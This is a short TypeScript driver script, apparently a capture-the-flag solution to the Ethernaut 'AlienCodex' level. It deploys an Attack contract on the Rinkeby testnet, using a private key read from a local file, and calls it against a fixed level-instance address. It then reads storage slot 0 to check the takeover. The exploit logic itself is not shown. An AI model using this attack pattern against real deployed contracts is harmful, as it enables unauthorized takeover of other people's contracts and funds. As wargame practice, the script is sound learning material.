import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { keccak256 } from 'ethers/lib/utils';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { AlienCodex__factory, Attack__factory } from '../types/ethers-contracts';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0x5026325257192FE40CC0Bc51aE35D02eea7C7b19"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);
  (new Attack__factory(alice)).deploy().then(async attack => {
    await attack.attack(addr)
    console.log(await provider.getStorageAt(addr, 0))
  })
  
}

main().catch(e => {
  console.log("Error: " + e)
})
